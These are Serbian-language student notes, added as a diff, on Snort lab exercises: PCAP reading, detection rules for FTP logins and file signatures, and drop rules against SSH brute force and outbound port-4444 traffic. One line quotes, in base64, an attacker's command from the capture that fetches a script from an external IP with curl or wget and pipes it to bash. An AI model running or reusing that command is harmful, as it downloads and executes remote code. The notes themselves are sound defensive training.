@@ -1,0 +1,127 @@
+****** PCAP citanje, analiza i primena pravila
+
+kroz cmd odemo u folder gde su nam fajlovi za zadatke
+
+ovo su komande koje se koriste za zadatke...
+
+alert tcp any any <> any 80 (msg: "NADJEN PORT"; sid:100001; rev:1;)   --pravilo koje dtektuje sve portove 80 na tcp  (sledeci zad sa portom 21, sve isto)
+
+sudo snort -c local.rules -r mx-3.pcap   --primena pravila: primenjujemo pravila koja se nalaze u istom folderu na fajl mx-3
+
+sudo snort -r snort.log.1748022673 -n 63   --rezim citanja: proveravamo kreirani log za prva 63 paketa citanje moze i preko tcpdump (-X vise detalja)
+
+strings ftp-png-gif.pcap | grep -ia ftp    --iz binarnih fajlova izvlacimo korisne informacije (filtrira sve linije koje sadrze ftp -i case insensitive, -a obradi binarne fajlove kao tekstualne)
+ 
+strings ftp-png-gif.pcap | grep -iac "530 User"  --nadji sve neuspesne logove (poruka 530 user), -c za broj takvih pojava
+                                                  --(230 user je uspesno logovanje, to je sl zad)
+                                                  --331 Password detektuje ftp login pokusaje kada se unese validan username ali password ne
+
+Sve ovo moze da se uradi dodvanjem pravila. Kada postane kompolikovanije trebalo bi da se radi preko pravila. 
+U sledecem zadatku mi se trazi kada se unese validan username ali password ne, username je administrator
+
+dodam pravilo i pokrenem snort:
+alert tcp any any <> any 21 (msg:"nadjen port 21!!!"; content:"Administrator";content:"331 Password";nocase; sid:100001; rev:1;)
+
+ali ipak moze da se uradi kroz cmd ovako, bez dodavanja pravila i pokretanja snort-a: 
+strings ftp-png-gif.pcap | grep -ia "331 Password" | grep -ic "Administrator"
+................
+
+pravilo koje detkeuje png (trazi binarni zapis za png)
+alert tcp any any <> any any (msg: "PNG file pronadjen!!!"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid: 100001; rev:1;)
+
+sudo snort -c local.rules -r ftp-png-gif.pcap -X -l .   --da dobijem log
+
+sudo snort -r snort.log.1748285776 -X    --da ga procitam
+
+prvi nacin pravilo:
+alert tcp any any <> any any (msg: "gif file pronadjen!!!"; content:"GIF8"; sid: 100001; rev:1;)
+
+kad napisem pravilo na prvi (ili drugi nacin) procitam log koji je kreiran sa ovim pravilom (sudo snort -c local.rules -r ftp-png-gif.pcap -X -l .)
+u ovom logu trazim u podacima (paketima) kojeg je formata
+
+drugi nacin sa 2 pravila:
+alert tcp any any -> any any (msg:"GIF87a file detected"; content:"GIF87a"; sid:1000004; rev:1;)
+alert tcp any any -> any any (msg:"GIF89a file detected"; content:"GIF89a"; sid:1000005; rev:1;)
+
+na drugi nacin mogu cak u alert da idem i gledam gde je poruka msg koja mi odgovara (odnosno za pravilo koje je proslo)
+
+................
+
+pravilo za detektovanje torrent paketa:
+alert tcp any any <> any any (msg: "torrent file pronadjen!!!"; content:".torrent"; sid: 100001; rev:1;)
+
+napomena*: u alerts u konzoli odmah nakon izvestaja ili u alert generisanom fajlu mogu da pogledam rezultat
+
+...........
+
+alert tcp any any -> any any (msg:"sdasdsaasd"; dsize:770<>855; sid:1000001; rev:1;)
+
+
+komanda koju je izvrsio napadace je u base 64 i treba je prevesti
+
+sve ove informacije se nalaze kada se poricta log fajl sa: snort -r logfajl -X 
+mora malo da se cunja jer je nepregledno sve nabacano, ali sve moze tu da se nadje
+
+pronalazak komande koja je izvrsena ali je treba prevesti iz base 64
+KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=
+
+
+******************************
+********* LIVE ATTACK ********
+z1*uzivo snimanje i sprecavanje bruteforce napada
+
+sudo snort -dev -l .   --sniffer mode i pravi log fajl
+sudo snort -r imelogfajla  --log mode, citanje log fajla
+
+sudo snort -r imelogfajla 'port 22' -n 10   --filtriramo citanje log file samo na port 22 i uzimamo prvih 10
+
+lokacija snorta: /etc/snort/rules/local.rules
+
+drop tcp any 22 <- any any (msg: "blokiran ulazni sabrocaj na portu 22 zbog bruteforce napada", sid: 100001; rev:1;)
+
+sudo snort -c /etc/snort/snort.conf -q -Q --daq afpacket -i eth0:eth1 -A full   --gadjam config a local rules se ukljucuje iz konfiguracionog fajla!!! blokiram saobracaj po local pravilu
+
+
+/////////ovako bi trebalo da radi hvatanje u konzolu, ALI NE RADI PRIKAZ U KONZOLI !!!!!
+sudo snort -A console -q -c /etc/snort/snort.conf -i eth0   --Pokreni Snort sa prikazom alarma direktno u terminalu (bez log fajla):
+sudo snort -A full -q -c /etc/snort/snort.conf -i eth0      --Ponovo koristi pravilo, ali sada loguj sve detalje o napadu u fajlove.
+
+--Prepravi pravilo da umesto upozorenja – blokira saobraćaj.
+drop tcp any 22 <- any any (msg: "blokiran ulazni sabrocaj na portu 22 zbog bruteforce napada", sid: 100001; rev:1;)
+sudo snort -Q --daq afpacket -i eth0:eth1 -c /etc/snort/snort.conf -A full -q  
+/////////
+
+
+z2*analiza i blokiranje odlaznog saobracaja
+
+u paketima vidimo oznake:
+***A**** znači da je TCP flag ACK uključen.
+******S* znači da je TCP flag SYN uključen (inicijacija veze).
+***AP*** znači ACK i PUSH flagovi su uključeni (prijenos podataka).
+
+snimamo saobracaj u log fajl i pregledamo...
+
+sudo snort -dev -l . 
+sudo snort -r imelogfajla  
+
+ovde primecujemo da se u nasoj mrezi odvija saobracaj izmedju dve eksterne ip adrese (sumnjiva port je 444) jer je poznat po koriscenju
+metasploita.
+
+dodajemo pravilo i izvrsavamo :
+
+drop tcp any 4444 -> any any (msg: "blokiranje odlaznog saobracaja na port 444"; sid: 100001; rev:1;)
+
+sudo snort -c /etc/snort/snort.conf -q -Q --daq afpacket -i eth0:eth1 -A full
+
+
+
+
+
+
+
+
+
+
+
+
+
